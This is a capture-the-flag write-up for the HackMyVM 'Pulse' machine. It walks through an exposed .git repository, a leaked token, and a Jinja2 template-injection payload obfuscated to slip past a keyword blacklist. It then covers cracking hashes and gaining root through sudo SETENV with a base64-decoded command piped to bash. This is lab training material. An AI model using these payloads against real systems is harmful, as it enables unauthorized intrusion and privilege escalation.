# Pulse - HackMyVm

Difficulty: Medium

## Enumeration

- Nmap:

```bash
$ sudo nmap -sC -sV -A <ip> -o nmap.txt -p-
```

```
# Nmap 7.99 scan initiated Thu Oct 15 09:37:49 2026 as: /usr/lib/nmap/nmap -sC -sV -A -p- -o nmap.txt --stats-every=5s 192.168.1.4
Nmap scan report for 192.168.1.4
Host is up (0.00096s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.28.3 (Ubuntu)
|_http-title: Pulse Systems | Distributed Telemetry & Infrastructure Observa...
|_http-server-header: nginx/1.28.3 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/dev/ /internal/
MAC Address: 08:00:27:43:0F:49 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=10/15%OT=22%CT=1%CU=36888%PV=Y%DS=1%DC=D%G=Y%M=080027%
OS:TM=6AD0D74F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=
OS:I%TS=21)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=22)SEQ(SP=107%GCD=1%I
OS:SR=107%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=Z%TS=21)SEQ
OS:(SP=FC%GCD=1%ISR=FE%TI=Z%CI=Z%II=I%TS=22)OPS(O1=M5B4ST11NW8%O2=M5B4ST11N
OS:W8%O3=M5B4NNT11NW8%O4=M5B4ST11NW8%O5=M5B4ST11NW8%O6=M5B4ST11)WIN(W1=FE88
OS:%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4
OS:NNSNW8%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.96 ms 192.168.1.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 15 09:38:23 2026 -- 1 IP address (1 host up) scanned in 34.06 seconds
```

### Port 22

- Just SSH, nothing interesting

### Port 80

- Runs a static site.
- Nmap says `robots.txt` is present, which contains 2 disallowed endpoints `/dev` and `/internal` 
- Robots.txt:

```
User-agent: *
Disallow: /dev/
Disallow: /internal/

# Pulse Infrastructure Portal
# Notice: Internal monitoring and diagnostic tools moved to: http://monitor.pulse.hmv
```

- So I registered 2 vhosts in `/etc/hosts`, **pulse.hmv** and **monitor.pulse.hmv**

### pulse.hmv/dev

- Contains this:

```

Pulse Systems - Internal DevOps Bulletin (Sprint 42)

Author: Alex Morgan (alex@pulse.hmv)

Date: 2026-09-08

Team updates and security reminders:

    The real-time node monitoring portal has been published to http://monitor.pulse.hmv.
    CRITICAL SECURITY REMINDER: After the recent staging audit, remember to sanitize production directories! Never leave raw .git repository folders exposed on public web roots.
    The diagnostic alerting endpoint /diagnostics now requires authorization. The access token was committed to the repository for staging tests.
    Database user synchronization utility will run nightly from /opt/pulse/.

Internal Pulse Confidential - Do Not Distribute Outside HMV Intranet
```

### monitor.pulse.hmv

- Contains another website but it contains a link to an *Alert Diagnostics Tool*
- This tool requires an authtoken to post messages.
- The note in `/dev` gives us a hint, to look for raw **.git** endpoints on the webserver.
- I used ffuf with the *dirb common.txt* wordlist to confirm the existence of the *.git* endpoint.
- Use git-dumper to extract the .git folder.

### Source Code Analysis

- Code to the monitor.pulse.hmv server is as follows:

```python
#!/usr/bin/env python3
import os
import datetime
from flask import Flask, render_template, render_template_string, request, jsonify

app = Flask(__name__)
app.config['SECRET_KEY'] = 'c798e1f02a45b891d2ef64098bc19a32'

# Security token for automated alerting diagnostic probes
DIAGNOSTIC_TOKEN = "c3ns0r3d-try-1t-1t5-4-g00d-b0x"

SYSTEM_NODES = [
    {"name": "Core-Gateway-01", "ip": "10.0.2.15", "status": "UP", "cpu": "14%", "mem": "42%", "latency": "1.2ms"},
    {"name": "Telemetry-Broker-01", "ip": "10.0.2.16", "status": "UP", "cpu": "28%", "mem": "61%", "latency": "2.4ms"},
    {"name": "Audit-Pipeline-01", "ip": "10.0.2.17", "status": "UP", "cpu": "9%", "mem": "33%", "latency": "1.8ms"},
    {"name": "Database-Cluster-Primary", "ip": "10.0.2.18", "status": "UP", "cpu": "35%", "mem": "78%", "latency": "0.9ms"}
]

@app.route('/')
def index():
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
    return render_template('index.html', nodes=SYSTEM_NODES, timestamp=now)

@app.route('/api/nodes', methods=['GET'])
def api_nodes():
    return jsonify({
        "status": "success",
        "cluster": "pulse-prod-eu",
        "nodes": SYSTEM_NODES
    })

@app.route('/diagnostics', methods=['GET', 'POST'])
def diagnostics():
    if request.method == 'GET':
        return render_template('diagnostics.html')

    token = request.headers.get('X-Pulse-Auth') or request.form.get('token') or request.args.get('token')
    if token != DIAGNOSTIC_TOKEN:
        return jsonify({
            "status": "error",
            "message": "Access Denied: Missing or invalid diagnostic authentication token."
        }), 403

    template = request.form.get('template') or request.args.get('template') or "System Health: All metrics within threshold."

    # Filter dangerous keywords in templates
    blacklist = ['os', 'popen', 'system', 'subprocess', 'eval', 'exec', 'commands', '__import__']
    for keyword in blacklist:
        if keyword in template.lower():
            return jsonify({
                "status": "error",
                "message": f"Security restriction: Keyword '{keyword}' is blocked by template sanitizer."
            }), 400

    try:
        rendered = render_template_string(template)
        return jsonify({
            "status": "success",
            "output": rendered
        })
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Template compilation failed: {str(e)}"
        }), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

- Using this token we can now add templates.
- The `/diagnostics` endpoint is vulnerable to SSTI since it uses `render_template_string` with minimal validation.

### Initial Foothold

- The payload I used to gain RCE from this endpoint is as follows:

```python
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fim"+"port\x5f\x5f"]("o"+"s")["po"+"pen"]("ls -la")["read"]() %} {{a}} {% endwith %}
```

> NOTE: You can look for more payloads [here](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html).


### Pivoting and User

- From the hints in the `/dev` endpoint we can read `/opt/pulse/data/users.db` and read the users table.
- The passwords can be cracked using john the ripper as follows:

```bash
$ john hashes.txt
```

- Use this to login as the user alex.


### Privilege Escalation

- Running `sudo -l`:

```bash
User alex may run the following commands on pulse:
    (ALL : ALL) SETENV: NOPASSWD: /usr/local/bin/pulse-audit
```

- The source code is as follows:

```python
#!/usr/bin/env python3
import os
import sys
import json
import subprocess
import datetime

BANNER = """
======================================================
   Pulse Infrastructure Automated Security Auditor
   Version 1.8.2-enterprise
======================================================
"""

def main():
    print(BANNER)
    config_path = os.environ.get("PULSE_CONFIG", "/etc/pulse/audit_rules.json")
    print(f"[*] Loading audit profile from: {config_path}")

    if not os.path.isfile(config_path):
        print(f"[!] Error: Configuration file '{config_path}' not found.")
        sys.exit(1)

    try:
        with open(config_path, "r") as f:
            cfg = json.load(f)
    except Exception as e:
        print(f"[!] Error parsing configuration: {e}")
        sys.exit(1)

    policy = cfg.get("policy_name", "Standard-Baseline-Audit")
    print(f"[+] Active Audit Policy: {policy}")

    # Execute optional pre-audit initialization routine
    if "pre_audit_cmd" in cfg and cfg["pre_audit_cmd"]:
        print(f"[*] Executing pre-audit routine: {cfg['pre_audit_cmd']}")
        try:
            subprocess.run(cfg["pre_audit_cmd"], shell=True)
        except Exception as e:
            print(f"[!] Pre-audit task error: {e}")

    # Simulated system checks
    print("[*] Verifying critical service health...")
    services = cfg.get("monitored_services", ["nginx", "ssh", "pulse-monitor"])
    for svc in services:
        res = subprocess.run(["systemctl", "is-active", svc], capture_output=True, text=True)
        status = "ACTIVE (OK)" if res.returncode == 0 else "INACTIVE/FAILED"
        print(f"    - Service {svc:<15}: {status}")

    # Execute post-audit hooks
    if "post_audit_cmd" in cfg and cfg["post_audit_cmd"]:
        print(f"[*] Executing post-audit routine: {cfg['post_audit_cmd']}")
        try:
            subprocess.run(cfg["post_audit_cmd"], shell=True)
        except Exception as e:
            print(f"[!] Post-audit task error: {e}")

    print(f"\n[+] Audit scan completed successfully at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

if __name__ == "__main__":
    main()
```

- We can read `/etc/pulse/audit_rules.json` to get this:

```javascript
{
    "policy_name": "Production-Baseline-Security-Audit",
    "monitored_services": ["nginx", "ssh", "pulse-monitor"],
    "pre_audit_cmd": "",
    "post_audit_cmd": "",
    "log_destination": "/var/log/pulse/audit.log"
}
```

- We can see that it reads pre_audit_cmd from the audit_rules.json file. But we cannot write to it.
- This is where the `sudo -l` output comes in. We have `SETENV` perms as well, and we can see that it reads the environment variable passed to it to load this config file.
- So we will copy `audit_rules.json` to `/tmp` and then use it to run the pre audit command and gain root.
- I wrote `audit_rules.json` like this:

```javascript
{
    "policy_name": "Production-Baseline-Security-Audit",
    "monitored_services": ["nginx", "ssh", "pulse-monitor"],
    "pre_audit_cmd": "echo <base64_encoded_payload> | base64 -d | bash",
    "post_audit_cmd": "",
    "log_destination": "/var/log/pulse/audit.log"
}
```

- Now read the root flag as the `root` user.


Happy Hacking :)
